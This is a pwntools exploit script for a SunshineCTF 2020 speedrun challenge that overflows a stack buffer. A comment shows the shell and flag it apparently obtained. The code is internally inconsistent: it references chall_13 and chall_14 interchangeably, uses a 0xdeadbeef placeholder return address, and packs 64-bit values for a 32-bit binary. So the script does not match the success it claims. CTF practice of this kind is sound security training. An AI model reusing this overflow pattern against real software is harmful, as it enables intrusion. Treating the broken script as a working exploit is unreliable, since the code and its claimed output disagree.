from pwn import *

e = ELF('./chall_13')

#p = remote('chal.2020.sunshinectf.org', 30013)
p = process('./chall_14')

p.readline()
p.send(b'yolo\n')

rop = ROP('./chall_14')

input('...')

data = b'a'*0x68
data += p64(0xdeadbeef)

p.send(data)
p.send('\n')
p.interactive()

'''
[*] '/vagrant/junkdrawer/sunshine/speedrun/chall_13'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to chal.2020.sunshinectf.org on port 30013: Done
...
[*] Switching to interactive mode
$ ls
chall_13
flag.txt
$ cat flag.txt
sun{almost-easy-61ddd735cf9053b0}
'''
